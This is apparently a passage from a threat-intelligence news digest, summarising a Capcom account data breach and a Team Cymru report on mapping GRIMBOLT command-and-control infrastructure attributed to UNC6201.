  - Title: Capcom data breach exposes 11.7 million account records
  - Published: 2026-10-23T09:07:31+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/23/capcom-id-data-breach-11-million-records-exposed/
  - Summary: Players who signed up for Capcom’s online account service may want to look twice at emails that seem to come from the company. The company has disclosed that a third party gained unauthorized access to customer information linked to CAPCOM ID, the account people use to sign in to the company’s web services and to play some of its games online. It detected suspicious activity on October 19 and confirmed the intrusion the same day. … More → The post Capcom data breach exposes 11.7 million account records appeared first on Help Net Security .

### Cluster b04cf6724c — score 10

- Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC6201

#### Cluster taxonomy (union across members)
- actor_attribution: UNC6201
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- actor_attribution: UNC6201
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
  - Summary: Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.
